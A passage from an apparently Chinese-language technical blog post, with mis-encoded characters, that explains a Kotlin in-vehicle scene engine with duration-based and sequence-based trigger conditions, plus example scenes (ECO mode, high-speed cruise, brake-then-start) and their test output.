    <span class="hljs-keyword">val</span> seqSatisfied = <span class="hljs-keyword">if</span> (seqCond != <span class="hljs-literal">null</span>) {
        updateAndCheckSequence(scene.id, seqCond, triggerSignal, now)
    } <span class="hljs-keyword">else</span> <span class="hljs-literal">true</span>

    <span class="hljs-comment">// 2. å¤„ç†æ™®é€šæ¡ä»¶ (Duration é€»è¾‘)</span>
    <span class="hljs-keyword">val</span> normalConds = scene.enterConditions.filter { it !<span class="hljs-keyword">is</span> SequenceCondition }
<span class="hljs-keyword">var</span> allNormalSatisfied = <span class="hljs-literal">true</span>

    normalConds.forEach { cond -&gt;
<span class="hljs-keyword">if</span> (evaluateCondition(cond)) {
            enterState.putIfAbsent(cond, now) <span class="hljs-comment">// è®°å½•é¦–æ¬¡æ»¡è¶³çš„æ—¶é—´æˆ³</span>
        } <span class="hljs-keyword">else</span> {
            enterState.remove(cond) <span class="hljs-comment">// ä¸€æ—¦ä¸æ»¡è¶³ç«‹å³æ¸…é™¤è®¡æ—¶</span>
            allNormalSatisfied = <span class="hljs-literal">false</span>
        }
    }

<span class="hljs-comment">// 3. ç»¼åˆåˆ¤å®š</span>
    <span class="hljs-keyword">if</span> (allNormalSatisfied &amp;&amp; seqSatisfied &amp;&amp; scene.enterConditions.isNotEmpty()) {
        <span class="hljs-keyword">val</span> allDurationMet = normalConds.all { cond -&gt;
<span class="hljs-keyword">val</span> startTime = enterState[cond] ?: now
            (now - startTime) &gt;= cond.durationMs
        }

<span class="hljs-keyword">if</span> (allDurationMet) {
            enterJobs[scene.id]?.cancel()
            scene.enter()
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// è®¡ç®—è¿˜éœ€è¦ç­‰å¾…å¤šä¹…</span>
            <span class="hljs-keyword">val</span> remainingWait = normalConds.maxOf { cond -&gt;
<span class="hljs-keyword">val</span> elapsed = now - (enterState[cond] ?: now)
                (cond.durationMs - elapsed).coerceAtLeast(<span class="hljs-number">0L</span>)
            }
scheduleReEvaluation(scene, remainingWait, <span class="hljs-literal">true</span>)
        }
    } <span class="hljs-keyword">else</span> {
        enterJobs[scene.id]?.cancel()
    }
}
</code></pre>
<h3 data-id="heading-10">2. æ—¶åºæ•æ„Ÿå‹åœºæ™¯</h3>
<p>éœ€æ±‚èƒŒæ™¯ï¼šæŸäº›åœºæ™¯çš„è§¦å‘éœ€ä¸¥æ ¼æŒ‰é¡ºåºæ‰§è¡Œï¼ˆå¦‚â€œè¸©åˆ¹è½¦ â†’ æŒ‰å¯åŠ¨é”®â€ï¼‰ã€‚ å®ç°æ–¹æ¡ˆï¼š</p>
<ul>
<li>
<p>å¼•å…¥ <code>SequenceCondition</code>ï¼Œå°†å¤šæ­¥æ“ä½œå°è£…ä¸ºä¸€ä¸ªå¤åˆæ¡ä»¶ã€‚</p>
</li>
<li>
<p>å¼•æ“å†…éƒ¨ç»´æŠ¤æ¯ä¸ªåœºæ™¯çš„åºåˆ—è¿›åº¦ï¼ˆ<code>sequenceProgress</code>ï¼‰å’Œæ­¥éª¤é—´çš„æ—¶é—´çª—å£ï¼ˆ<code>timeoutMs</code>ï¼‰ã€‚</p>
</li>
<li>
<p>æ¯æ¬¡ä¿¡å·æ›´æ–°æ—¶ï¼š</p>
<ul>
<li>æ£€æŸ¥å‰ç½®æ­¥éª¤æ˜¯å¦ä»æœ‰æ•ˆï¼ˆé˜²æ­¢çŠ¶æ€å›é€€å¯¼è‡´é€»è¾‘é”™è¯¯ï¼‰ï¼›</li>
<li>è‹¥å½“å‰ä¿¡å·åŒ¹é…ä¸‹ä¸€æ­¥æ¡ä»¶ä¸”æœªè¶…æ—¶ï¼Œåˆ™æ¨è¿›è¿›åº¦ï¼›</li>
<li>è‹¥åºåˆ—å®Œæ•´åŒ¹é…ï¼Œåˆ™è§†ä¸ºæ¡ä»¶æ»¡è¶³ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SequenceCondition</span>(
    <span class="hljs-keyword">val</span> steps: List&lt;SequenceStep&gt;
) : Condition {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = steps.firstOrNull()?.condition?.signalKey ?: <span class="hljs-string">""</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>
}

<span class="hljs-comment">// åºåˆ—è¿›åº¦è¿½è¸ªï¼šsceneId -&gt; å½“å‰åŒ¹é…åˆ°çš„æ­¥éª¤ç´¢å¼•</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> sequenceProgress = ConcurrentHashMap&lt;String, <span class="hljs-built_in">Int</span>&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lastStepTimestamp = ConcurrentHashMap&lt;String, <span class="hljs-built_in">Long</span>&gt;()

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateAndCheckSequence</span><span class="hljs-params">(sceneId: <span class="hljs-type">String</span>, seq: <span class="hljs-type">SequenceCondition</span>, signal: <span class="hljs-type">Signal</span>?, now: <span class="hljs-type">Long</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">val</span> currentIndex = sequenceProgress.getOrDefault(sceneId, <span class="hljs-number">0</span>)
    <span class="hljs-keyword">if</span> (currentIndex == <span class="hljs-number">0</span> &amp;&amp; signal == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>

    <span class="hljs-comment">// è·å–å½“å‰æ­£åœ¨ç­‰å¾…åŒ¹é…çš„æ­¥éª¤</span>
    <span class="hljs-keyword">val</span> currentStep = seq.steps[currentIndex]

    <span class="hljs-comment">// ç­–ç•¥ï¼šæ£€æŸ¥å·²ç»åŒ¹é…æˆåŠŸçš„é‚£äº›æ­¥éª¤æ˜¯å¦ä¾ç„¶æœ‰æ•ˆ</span>
    <span class="hljs-comment">// å¦‚æœåºåˆ—è¦æ±‚ A -&gt; Bï¼Œå½“å‰åœ¨ç­‰ Bï¼Œä½† A çªç„¶ä¸æ»¡è¶³äº†ï¼Œåºåˆ—åº”é‡ç½®</span>
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until currentIndex) {
        <span class="hljs-keyword">if</span> (!evaluateCondition(seq.steps[i].condition)) {
            sequenceProgress[sceneId] = <span class="hljs-number">0</span> <span class="hljs-comment">// å‰ç½®æ­¥éª¤å¤±æ•ˆï¼Œé‡ç½®</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
    }

    <span class="hljs-comment">// æ£€æŸ¥æ­¥éª¤é—´æ˜¯å¦è¶…æ—¶</span>
    <span class="hljs-keyword">val</span> lastTime = lastStepTimestamp.getOrDefault(sceneId, <span class="hljs-number">0L</span>)
    <span class="hljs-keyword">if</span> (currentIndex &gt; <span class="hljs-number">0</span> &amp;&amp; (now - lastTime) &gt; currentStep.timeoutMs) {
        sequenceProgress[sceneId] = <span class="hljs-number">0</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }

    <span class="hljs-comment">// å¤„ç†å½“å‰ä¿¡å·è§¦å‘çš„è¿›åº¦æ¨è¿›</span>
    <span class="hljs-keyword">if</span> (signal != <span class="hljs-literal">null</span> &amp;&amp; signal.key == currentStep.condition.signalKey) {
        <span class="hljs-keyword">if</span> (evaluateCondition(currentStep.condition)) {
            <span class="hljs-keyword">val</span> nextIndex = currentIndex + <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> (nextIndex &gt;= seq.steps.size) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> <span class="hljs-comment">// åºåˆ—å…¨åŒ¹é…</span>
            } <span class="hljs-keyword">else</span> {
                sequenceProgress[sceneId] = nextIndex
                lastStepTimestamp[sceneId] = now
            }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (currentIndex &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å¦‚æœæ˜¯å½“å‰æ­¥éª¤çš„ä¿¡å·å‘ç”Ÿäº†å˜åŒ–ä¸”å˜å¾—ä¸æ»¡è¶³ï¼Œé‡ç½®</span>
            sequenceProgress[sceneId] = <span class="hljs-number">0</span>
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
}
</code></pre>
<h2 data-id="heading-11">å››ã€ä½¿ç”¨æ–¹å¼</h2>
<h3 data-id="heading-12">1. æ»¡è¶³æ¡ä»¶å³å¯è‡ªåŠ¨è§¦å‘çš„åœºæ™¯</h3>
<p>è§„åˆ™ï¼šè½¦è¾†ç”µé‡ä½äº 20% æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ ECO æ¨¡å¼ï¼Œç”µé‡é«˜äº60ï¼… æ—¶ï¼Œè‡ªåŠ¨é€€å‡º ECO æ¨¡å¼</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 1. è‡ªåŠ¨è§¦å‘ECOæ¨¡å¼</span>
<span class="hljs-comment">// è§„åˆ™ï¼šè½¦è¾†ç”µé‡ä½äº 20% æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ ECO æ¨¡å¼ï¼Œç”µé‡é«˜äº60ï¼… æ—¶ï¼Œè‡ªåŠ¨é€€å‡º ECO æ¨¡å¼</span>
<span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">ecoScene</span> = <span class="hljs-selector-tag">Scene</span><span class="hljs-selector-class">.create</span>(
    id = <span class="hljs-string">"eco_mode"</span>,
    name = <span class="hljs-string">"ECO æ¨¡å¼"</span>,
    enterActions = <span class="hljs-built_in">listOf</span>(<span class="hljs-built_in">Action</span>(<span class="hljs-string">"enable_eco_mode"</span>, <span class="hljs-built_in">mapOf</span>(<span class="hljs-string">"mode"</span> to <span class="hljs-string">"eco"</span>))),
    exitActions = <span class="hljs-built_in">listOf</span>(<span class="hljs-built_in">Action</span>(<span class="hljs-string">"disable_eco_mode"</span>, <span class="hljs-built_in">mapOf</span>(<span class="hljs-string">"mode"</span> to <span class="hljs-string">"eco"</span>))),
    enterConditions = <span class="hljs-built_in">listOf</span>(
        Condition.<span class="hljs-built_in">LessThan</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">20</span>)
    ),
    exitConditions = <span class="hljs-built_in">listOf</span>(
        Condition.<span class="hljs-built_in">GreaterThan</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">60</span>)
    ),
    onEnter = { <span class="hljs-selector-tag">actions</span> <span class="hljs-selector-tag">-</span>&gt;
 <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ğŸŸ¢ [åœºæ™¯æ¿€æ´»] å·²è¿›å…¥ ECO æ¨¡å¼ï¼šå¼€å¯èŠ‚èƒ½æ¨¡å¼\n"</span>)
        <span class="hljs-comment">// è§£æ actions æ‰§è¡Œå…¶ä»–æ“ä½œ</span>
    } ,
    <span class="hljs-selector-tag">onExit</span> = { <span class="hljs-selector-tag">actions</span> <span class="hljs-selector-tag">-</span>&gt;
 <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ğŸ”´ [åœºæ™¯é€€å‡º] å·²é€€å‡º ECO æ¨¡å¼ï¼šå…³é—­èŠ‚èƒ½æ¨¡å¼\n"</span>)
    } ,
)
<span class="hljs-selector-tag">engine</span><span class="hljs-selector-class">.addScene</span>(ecoScene)

<span class="hljs-comment">// --- æµ‹è¯• 1: åºåˆ—äº‹ä»¶éªŒè¯ ---</span>
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"--- æµ‹è¯• 1: æµ‹è¯•åœºæ™¯å¼•æ“ï¼ˆè‡ªåŠ¨è§¦å‘ECOæ¨¡å¼ï¼‰ ---"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">10</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">30</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">50</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">70</span>))
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<ul>
<li>å½“å¼•æ“æ¥æ”¶åˆ°ç”µé‡=10æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ã€Ecoæ¨¡å¼ã€‘</li>
<li>å½“å¼•æ“æ¥æ”¶åˆ°ç”µé‡=70æ—¶ï¼Œè‡ªåŠ¨é€€å‡ºã€Ecoæ¨¡å¼ã€‘</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">--- æµ‹è¯• 1: æµ‹è¯•åœºæ™¯å¼•æ“ï¼ˆè‡ªåŠ¨è§¦å‘ECOæ¨¡å¼ï¼‰ ---
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">10</span>)
ğŸŸ¢ <span class="hljs-section">[åœºæ™¯æ¿€æ´»]</span> å·²è¿›å…¥ ECO æ¨¡å¼ï¼šå¼€å¯èŠ‚èƒ½æ¨¡å¼

<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">30</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">50</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">70</span>)
ğŸ”´ <span class="hljs-section">[åœºæ™¯é€€å‡º]</span> å·²é€€å‡º ECO æ¨¡å¼ï¼šå…³é—­èŠ‚èƒ½æ¨¡å¼
</code></pre>
<h3 data-id="heading-13">2. æŒç»­æ»¡è¶³è§„å®šçš„æ—¶é—´æ‰å¯è§¦å‘çš„åœºæ™¯</h3>
<p>è§„åˆ™ï¼šè½¦é€Ÿå¿…é¡»å¤§äº 80 km/hï¼Œä¸”æŒç»­ 5 ç§’æ‰èƒ½è§¦å‘ï¼ˆé˜²æ­¢å› ç¬é—´åŠ é€Ÿè¯¯è§¦å‘ï¼‰ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 2. å®šä¹‰å¸¦æŒç»­æ—¶é—´çš„åœºæ™¯ï¼šé«˜é€Ÿå·¡èˆªæ¨¡å¼</span>
<span class="hljs-comment">// è§„åˆ™ï¼šè½¦é€Ÿå¿…é¡»å¤§äº 80 km/hï¼Œä¸”æŒç»­ 5 ç§’ï¼Œé˜²æ­¢å› ç¬é—´åŠ é€Ÿè¯¯è§¦å‘</span>
val highSpeedScene = Scene<span class="hljs-selector-class">.create</span>(
    id = "high_speed_cruise",
    name = "é«˜é€Ÿå·¡èˆªæ¨¡å¼",
    enterConditions = listOf(
        Condition.GreaterThan("speed", <span class="hljs-number">80</span>, duration = <span class="hljs-number">5000</span>) <span class="hljs-comment">// å¿…é¡»æŒç»­ 5s</span>
    ),
    exitConditions = <span class="hljs-built_in">listOf</span>(
        Condition.LessThan("speed", <span class="hljs-number">70</span>) <span class="hljs-comment">// é€€å‡ºåˆ™ä¸éœ€è¦æŒç»­æ—¶é—´</span>
    ),
    onEnter = { actions -&gt;
 <span class="hljs-built_in">println</span>("ğŸŸ¢ [åœºæ™¯æ¿€æ´»] å·²è¿›å…¥é«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå±•å¼€å°¾ç¿¼\n")
        <span class="hljs-comment">// è§£æ actions æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œå¦‚è°ƒæ•´å‘åŠ¨æœºæ€§èƒ½</span>
    } ,
    onExit = { actions -&gt;
 <span class="hljs-built_in">println</span>("ğŸ”´ [åœºæ™¯é€€å‡º] é€€å‡ºé«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå…³é—­å°¾ç¿¼\n")
    }
)
engine<span class="hljs-selector-class">.addScene</span>(highSpeedScene)

<span class="hljs-comment">// --- æµ‹è¯• 2: æŒç»­æ—¶é—´éªŒè¯ ---</span>
<span class="hljs-built_in">println</span>("--- æµ‹è¯• <span class="hljs-number">2</span>: å¼€å§‹æŒç»­æ—¶é—´éªŒè¯ (Speed &gt; <span class="hljs-number">80</span> for <span class="hljs-number">5s</span>) ---")
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">100</span>))
<span class="hljs-built_in">println</span>("å½“å‰è½¦é€Ÿ <span class="hljs-number">100</span>ï¼Œç­‰å¾…å¼•æ“è®¡æ—¶...")
<span class="hljs-comment">// æ¨¡æ‹Ÿ 3 ç§’åæŸ¥çœ‹çŠ¶æ€ï¼ˆæ­¤æ—¶ä¸åº”æ¿€æ´»ï¼Œå› ä¸ºæœªæ»¡ 5sï¼‰</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
<span class="hljs-built_in">println</span>("è®¡æ—¶ <span class="hljs-number">3s</span> æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: ${engine.isSceneActive(highSpeedScene.id)}")
<span class="hljs-comment">// å†ç­‰ 3 ç§’ï¼ˆæ€»è®¡ 6sï¼‰ï¼Œåº”è¯¥æ¿€æ´»</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
<span class="hljs-built_in">println</span>("è®¡æ—¶ <span class="hljs-number">6s</span> æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: ${engine.isSceneActive(highSpeedScene.id)}")
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">67</span>))
<span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>)

<span class="hljs-comment">// --- æµ‹è¯• 3: ä¿¡å·æŠ–åŠ¨æ‹¦æˆª ---</span>
<span class="hljs-built_in">println</span>("--- æµ‹è¯• <span class="hljs-number">3</span>: æµ‹è¯•ä¿¡å·æŠ–åŠ¨æ˜¯å¦ä¼šé‡ç½®è®¡æ—¶ ---")
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">60</span>)) <span class="hljs-comment">// å…ˆé™é€Ÿ</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>)
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">120</span>)) <span class="hljs-comment">// é‡æ–°æé€Ÿ</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">50</span>)) <span class="hljs-comment">// åœ¨ 5s åˆ°è¾¾å‰çªç„¶é™é€Ÿ</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
<span class="hljs-built_in">println</span>(
    "ä¿¡å·æŠ–åŠ¨åï¼ˆæœªæ»¡<span class="hljs-number">5s</span>å³ä¸­æ–­ï¼‰ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: ${
        engine.isSceneActive(
            highSpeedScene.id
        )
    }"
)
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<ul>
<li>è½¦é€Ÿ=100æ—¶ï¼Œã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘æ²¡æœ‰ç«‹å³æ¿€æ´»</li>
<li>æŒç»­5såï¼Œè‡ªåŠ¨è§¦å‘ã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘</li>
<li>è½¦é€Ÿ=67æ—¶ï¼Œè‡ªåŠ¨é€€å‡ºã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘</li>
<li>å½“è½¦é€Ÿå…ˆé€’å¢è‡³120ï¼Œå†ä¸‹é™è‡³50ï¼Œä¸ä¼šè§¦å‘ã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">--- æµ‹è¯• 2: å¼€å§‹æŒç»­æ—¶é—´éªŒè¯ (Speed &gt; 80 for 5s) ---
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">100</span>)
å½“å‰è½¦é€Ÿ 100ï¼Œç­‰å¾…å¼•æ“è®¡æ—¶...
è®¡æ—¶ 3s æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: false
ğŸŸ¢ <span class="hljs-section">[åœºæ™¯æ¿€æ´»]</span> å·²è¿›å…¥é«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå±•å¼€å°¾ç¿¼

è®¡æ—¶ 6s æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: true
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">67</span>)
ğŸ”´ <span class="hljs-section">[åœºæ™¯é€€å‡º]</span> é€€å‡ºé«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå…³é—­å°¾ç¿¼

--- æµ‹è¯• 3: æµ‹è¯•ä¿¡å·æŠ–åŠ¨æ˜¯å¦ä¼šé‡ç½®è®¡æ—¶ ---
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">60</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">120</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">50</span>)
ä¿¡å·æŠ–åŠ¨åï¼ˆæœªæ»¡5så³ä¸­æ–­ï¼‰ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: false
</code></pre>
<h3 data-id="heading-14">3. æ»¡è¶³è§„å®šçš„åºåˆ—æ‰å¯è§¦å‘çš„åœºæ™¯</h3>
<p>è§„åˆ™ï¼šå¿…é¡»å…ˆâ€œè¸©ä¸‹åˆ¹è½¦â€ï¼Œç„¶ååœ¨ 3 ç§’å†…â€œæŒ‰ä¸‹å¯åŠ¨é”®â€ï¼Œæ‰èƒ½æ¿€æ´»â€œåŠ¨åŠ›ç³»ç»Ÿâ€ã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 3. å¸¦åºåˆ—çš„å®‰å…¨å¯åŠ¨æ ¡éªŒåœºæ™¯</span>
<span class="hljs-comment">// è§„åˆ™ï¼šå¿…é¡»å…ˆâ€œè¸©ä¸‹åˆ¹è½¦â€ï¼Œç„¶ååœ¨ 3 ç§’å†…â€œæŒ‰ä¸‹å¯åŠ¨é”®â€ï¼Œæ‰èƒ½æ¿€æ´»â€œåŠ¨åŠ›ç³»ç»Ÿâ€</span>
<span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">securitySequenceScene</span> = <span class="hljs-selector-tag">Scene</span><span class="hljs-selector-class">.create</span>(
    id = <span class="hljs-string">"security_start"</span>,
    name = <span class="hljs-string">"å®‰å…¨å¯åŠ¨æ¨¡å¼"</span>,
    enterConditions = <span class="hljs-built_in">listOf</span>(
        <span class="hljs-built_in">SequenceCondition</span>(
            steps = <span class="hljs-built_in">listOf</span>(
                <span class="hljs-built_in">SequenceStep</span>(
                    Condition.<span class="hljs-built_in">Equals</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"pressed"</span>), timeoutMs = <span class="hljs-number">0</span>
                ),
                <span class="hljs-built_in">SequenceStep</span>(
                    Condition.<span class="hljs-built_in">Equals</span>(<span class="hljs-string">"start_button"</span>, <span class="hljs-string">"clicked"</span>), timeoutMs = <span class="hljs-number">3000</span>
                )
            )
        )
    ),
    enterActions = <span class="hljs-built_in">listOf</span>(<span class="hljs-built_in">Action</span>(<span class="hljs-string">"enable_motor"</span>, <span class="hljs-built_in">mapOf</span>(<span class="hljs-string">"power"</span> to <span class="hljs-number">100</span>))),
    onEnter = { <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ğŸŸ¢ [åœºæ™¯æ¿€æ´»] å®‰å…¨æ ¡éªŒé€šè¿‡ï¼šåŠ¨åŠ›ç³»ç»Ÿå·²å°±ç»ªï¼\n"</span>) }
)
<span class="hljs-selector-tag">engine</span><span class="hljs-selector-class">.addScene</span>(securitySequenceScene)

<span class="hljs-comment">// --- æµ‹è¯• 4: åºåˆ—äº‹ä»¶éªŒè¯ ---</span>
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"--- æµ‹è¯• 4: å¼€å§‹å®‰å…¨å¯åŠ¨åºåˆ—æµ‹è¯• ---"</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å…ˆè¸©ä¸‹åˆ¶åŠ¨è¸æ¿"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"pressed"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"æ¾å¼€åˆ¶åŠ¨è¸æ¿"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"unpressed"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"start_button"</span>, <span class="hljs-string">"clicked"</span>))
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å®‰å…¨å¯åŠ¨åœºæ™¯æ˜¯å¦æ¿€æ´»: ${engine.isSceneActive(securitySequenceScene.id)}"</span>)
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å†æ¬¡åˆ¶åŠ¨è¸æ¿"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"pressed"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">2000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"start_button"</span>, <span class="hljs-string">"clicked"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">" ============= æµ‹è¯•åœºæ™¯å¼•æ“ end ============"</span>)
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<ul>
<li>å…ˆè¸©ä¸‹åˆ¶åŠ¨è¸æ¿ï¼Œç´§æ¥ç€æ¾å¼€åˆ¶åŠ¨è¸æ¿</li>
<li>ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®ï¼Œã€å®‰å…¨å¯åŠ¨æ¨¡å¼ã€‘æœªæ¿€æ´»</li>
<li>å†æ¬¡è¸©ä¸‹åˆ¶åŠ¨è¸æ¿</li>
<li>ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®ï¼Œè‡ªåŠ¨è¿›å…¥ã€å®‰å…¨å¯åŠ¨æ¨¡å¼ã€‘</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">--- æµ‹è¯• 4: å¼€å§‹å®‰å…¨å¯åŠ¨åºåˆ—æµ‹è¯• ---
å…ˆè¸©ä¸‹åˆ¶åŠ¨è¸æ¿
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=brake_pedal, value=pressed)
æ¾å¼€åˆ¶åŠ¨è¸æ¿
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=brake_pedal, value=unpressed)
ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=start_button, value=clicked)
å®‰å…¨å¯åŠ¨åœºæ™¯æ˜¯å¦æ¿€æ´»: false
å†æ¬¡åˆ¶åŠ¨è¸æ¿
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=brake_pedal, value=pressed)
ç­‰å¾… 1 ç§’åæŒ‰ä¸‹å¯åŠ¨é”®
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=start_button, value=clicked)
